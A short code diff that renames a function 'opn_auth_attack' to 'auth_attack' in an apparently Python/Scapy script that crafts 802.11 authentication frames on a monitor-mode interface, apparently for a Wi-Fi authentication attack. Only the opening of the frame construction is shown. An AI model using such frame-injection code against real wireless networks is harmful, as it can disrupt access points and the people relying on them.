@@ -9,7 +9,7 @@ interface = 'mon0'
 ALGO_OPEN_AUTH = 0  # open authentication mode
 START_SEQNUM = 1  # sequence number
 
-def opn_auth_attack():
+def auth_attack():
     #authentication
     frame1 = RadioTap()\
         /Dot11(type=0, subtype=11, addr1=recipients_mac_adress, addr2=your_mac_adress, addr3=recipients_mac_adress)\
